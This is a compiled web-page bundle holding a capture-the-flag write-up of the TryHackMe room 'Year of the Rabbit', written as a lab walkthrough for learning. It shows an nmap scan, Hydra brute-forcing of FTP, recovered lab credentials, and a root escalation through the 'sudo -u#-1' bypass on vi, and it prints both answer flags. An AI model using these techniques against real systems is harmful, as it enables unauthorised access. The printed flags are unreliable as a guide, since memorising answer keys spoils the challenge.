"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[939],{3905:(e,t,r)=>{r.d(t,{Zo:()=>c,kt:()=>d});var n=r(67294);function o(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function a(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function s(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?a(Object(r),!0).forEach((function(t){o(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):a(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function i(e,t){if(null==e)return{};var r,n,o=function(e,t){if(null==e)return{};var r,n,o={},a=Object.keys(e);for(n=0;n<a.length;n++)r=a[n],t.indexOf(r)>=0||(o[r]=e[r]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(n=0;n<a.length;n++)r=a[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(o[r]=e[r])}return o}var l=n.createContext({}),p=function(e){var t=n.useContext(l),r=t;return e&&(r="function"==typeof e?e(t):s(s({},t),e)),r},c=function(e){var t=p(e.components);return n.createElement(l.Provider,{value:t},e.children)},u="mdxType",b={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},h=n.forwardRef((function(e,t){var r=e.components,o=e.mdxType,a=e.originalType,l=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),u=p(r),h=o,d=u["".concat(l,".").concat(h)]||u[h]||b[h]||a;return r?n.createElement(d,s(s({ref:t},c),{},{components:r})):n.createElement(d,s({ref:t},c))}));function d(e,t){var r=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var a=r.length,s=new Array(a);s[0]=h;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[u]="string"==typeof e?e:o,s[1]=i;for(var p=2;p<a;p++)s[p]=r[p];return n.createElement.apply(null,s)}return n.createElement.apply(null,r)}h.displayName="MDXCreateElement"},72577:(e,t,r)=>{r.r(t),r.d(t,{assets:()=>l,contentTitle:()=>s,default:()=>b,frontMatter:()=>a,metadata:()=>i,toc:()=>p});var n=r(87462),o=(r(67294),r(3905));const a={},s="Year of the Rabbit",i={unversionedId:"Tryhackme/Year of the Rabbit/Year of the rabbit",id:"Tryhackme/Year of the Rabbit/Year of the rabbit",title:"Year of the Rabbit",description:"Time to enter the warren...",source:"@site/writeups/Tryhackme/Year of the Rabbit/Year of the rabbit.md",sourceDirName:"Tryhackme/Year of the Rabbit",slug:"/Tryhackme/Year of the Rabbit/",permalink:"/writeups/Tryhackme/Year of the Rabbit/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Year of the Pig",permalink:"/writeups/Tryhackme/Year of the Pig/"},next:{title:"Zero Logon",permalink:"/writeups/Tryhackme/Zero Logon/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Flags",id:"flags",level:2}],c={toc:p},u="wrapper";function b(e){let{components:t,...a}=e;return(0,o.kt)(u,(0,n.Z)({},c,a,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"year-of-the-rabbit"},"Year of the Rabbit"),(0,o.kt)("p",null,"Time to enter the warren..."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/yearoftherabbit"},"Year of the Rabbit")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Poking"),(0,o.kt)("li",{parentName:"ul"},"Steganography"),(0,o.kt)("li",{parentName:"ul"},"Stored Passwords & Keys"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing (FTP)"),(0,o.kt)("li",{parentName:"ul"},"Cryptography",(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},"Brainfuck"))),(0,o.kt)("li",{parentName:"ul"},"Abusing SUID/GUID")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"flags"},"Flags"),(0,o.kt)("p",null,"Can you hack into the Year of the Rabbit box without falling down a hole?\n(Please ensure your volume is turned up!)"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Year of the Rabbit$ sudo nmap -A -sC -sV -O -Pn 10.10.20.247\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 19:39 CEST\nNmap scan report for 10.10.20.247\nHost is up (0.048s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.2\n22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)\n| ssh-hostkey:\n|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)\n|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)\n|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)\n|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)\n80/tcp open  http    Apache httpd 2.4.10 ((Debian))\n|_http-server-header: Apache/2.4.10 (Debian)\n|_http-title: Apache2 Debian Default Page: It works\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/4%OT=21%CT=1%CU=44187%PV=Y%DS=2%DC=T%G=Y%TM=5F7A08F\nOS:3%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS\nOS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1\nOS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN\nOS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 5900/tcp)\nHOP RTT      ADDRESS\n1   87.90 ms 10.8.0.1\n2   88.05 ms 10.10.20.247\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 27.73 seconds\n")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"view-source:http://10.10.20.247/assets/style.css"},"view-source:http://10.10.20.247/assets/style.css"))),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-css"},"/* Nice to see someone checking the stylesheets.\n     Take a look at the page: /sup3r_s3cr3t_fl4g.php\n  */\n")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"view-source:http://10.10.20.247/sup3r_s3cret_fl4g/"},"view-source:http://10.10.20.247/sup3r_s3cret_fl4g/"))),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-html"},'<html>\n  <head>\n    <title>sup3r_s3cr3t_fl4g</title>\n  </head>\n  <body>\n    <noscript>Love it when people block Javascript...<br /></noscript>\n    <noscript\n      >This is happening whether you like it or not... The hint is in the video.\n      If you\'re stuck here then you\'re just going to have to bite the bullet!<br />Make\n      sure your audio is turned up!<br\n    /></noscript>\n    <script>\n      alert("Word of advice... Turn off your javascript...");\n      window.location =\n        "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1";\n    <\/script>\n    <video controls>\n      <source src="/assets/RickRolled.mp4" type="video/mp4" />\n    </video>\n  </body>\n</html>\n')),(0,o.kt)("p",null,(0,o.kt)("img",{src:r(13399).Z,width:"1030",height:"202"})),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"10.10.20.247/WExYY2Cv-qU/"},"10.10.20.247/WExYY2Cv-qU/"))),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Year of the Rabbit$ strings Hot_Babe.png\nEh, you've earned this. Username for FTP is ftpuser\nOne of these is the password:\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Year of the Rabbit$ hydra -l ftpuser -P passwd.list ftp://10.10.20.247\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-04 20:11:37\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task\n[DATA] attacking ftp://10.10.20.247:21/\n[21][ftp] host: 10.10.20.247   login: ftpuser   password: 5iez1wGXKfPKQ\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Year of the Rabbit$ cat Eli\\'s_Creds.txt\n+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-\n--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+\n++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+\n+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<\n]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+\n++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---\n--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++\n+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+\n++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++\n<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++\n<]>+. <+++[ ->--- <]>-- ---.- ----. <\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"User: eli\nPassword: DSpDiM1wAEwid\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Year of the Rabbit$ ssh eli@10.10.20.247\nThe authenticity of host '10.10.20.247 (10.10.20.247)' can't be established.\nECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.20.247' (ECDSA) to the list of known hosts.\neli@10.10.20.247's password:\n\n\n1 new message\nMessage from Root to Gwendoline:\n\n\"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there\"\n\nEND MESSAGE\n\n\n\n\neli@year-of-the-rabbit:~$\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"eli@year-of-the-rabbit:~$ locate s3cr3t\n/usr/games/s3cr3t\n/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!\n/var/www/html/sup3r_s3cr3t_fl4g.php\neli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!\nYour password is awful, Gwendoline.\nIt should be at least 60 characters long! Not just MniVCQVhQHUNI\nHonestly!\n\nYours sincerely\n   -Root\neli@year-of-the-rabbit:~$ su gwendoline\nPassword:\ngwendoline@year-of-the-rabbit:/home/eli$ ls\ncore  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos\ngwendoline@year-of-the-rabbit:/home/eli$ cd ~\ngwendoline@year-of-the-rabbit:~$ ls\nuser.txt\ngwendoline@year-of-the-rabbit:~$ cat user.txt\nTHM{1107174691af9ff3681d2b5bdb5740b1589bae53}\ngwendoline@year-of-the-rabbit:~$\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"gwendoline@year-of-the-rabbit:~$ find / -user root -perm -4000 -exec ls -ldb {} \\; 2>>/dev/null\n-rwsr-xr-x 1 root root 40000 Mar 29  2015 /bin/mount\n-rwsr-xr-x 1 root root 27416 Mar 29  2015 /bin/umount\n-rwsr-xr-x 1 root root 40168 Nov 20  2014 /bin/su\n-rwsr-xr-x 1 root root 30800 Nov  8  2014 /bin/fusermount\n-rwsr-xr-x 1 root root 146160 Oct  5  2014 /bin/ntfs-3g\n-rwsr-xr-x 1 root root 10568 Feb 13  2015 /usr/bin/vmware-user-suid-wrapper\n-rwsr-sr-x 1 root root 10104 Apr  1  2014 /usr/bin/X\n-rwsr-sr-x 1 root mail 89248 Feb 11  2015 /usr/bin/procmail\n-rwsr-xr-x 1 root root 23168 Nov 28  2014 /usr/bin/pkexec\n-rwsr-xr-x 1 root root 75376 Nov 20  2014 /usr/bin/gpasswd\n-rwsr-xr-x 1 root root 39912 Nov 20  2014 /usr/bin/newgrp\n-rwsr-xr-x 1 root root 149568 Mar 12  2015 /usr/bin/sudo\n-rwsr-xr-x 1 root root 44464 Nov 20  2014 /usr/bin/chsh\n-rwsr-xr-x 1 root root 53616 Nov 20  2014 /usr/bin/chfn\n-rwsr-xr-x 1 root root 3124160 Feb 17  2015 /usr/sbin/exim4\n-rwsr-xr-- 1 root dip 333560 Apr 14  2015 /usr/sbin/pppd\n-rwsr-xr-x 1 root root 14632 Nov 28  2014 /usr/lib/policykit-1/polkit-agent-helper-1\n-rwsr-xr-- 1 root messagebus 294512 Feb  9  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n-rwsr-xr-x 1 root root 14200 Oct 15  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper\n-rwsr-xr-x 1 root root 464904 Mar 22  2015 /usr/lib/openssh/ssh-keysign\n-rwsr-xr-x 1 root root 10248 Apr 15  2015 /usr/lib/pt_chown\n-rwsr-xr-x 1 root root 10104 Feb 24  2014 /usr/lib/eject/dmcrypt-get-device\ngwendoline@year-of-the-rabbit:~$ sudo -l\nMatching Defaults entries for gwendoline on year-of-the-rabbit:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser gwendoline may run the following commands on year-of-the-rabbit:\n    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt\ngwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt\ngwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt\n\nroot\n\nPress ENTER or type command to continue\nroot@year-of-the-rabbit:/home/gwendoline# cd ~\nroot@year-of-the-rabbit:/# ls\nbin  boot  dev  etc  home  initrd.img  lib  lib64  live-build  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz\nroot@year-of-the-rabbit:/# cd /root/\nroot@year-of-the-rabbit:/root# cat root.txt\nTHM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}\nroot@year-of-the-rabbit:/root#\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What is the user flag?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{1107174691af9ff3681d2b5bdb5740b1589bae53}")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"What is the root flag?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}")))}b.isMDXComponent=!0},13399:(e,t,r)=>{r.d(t,{Z:()=>n});const n=r.p+"assets/images/2020-10-04_19-49-0854575b615c130fdb6f6bc8841ac00c.png"}}]);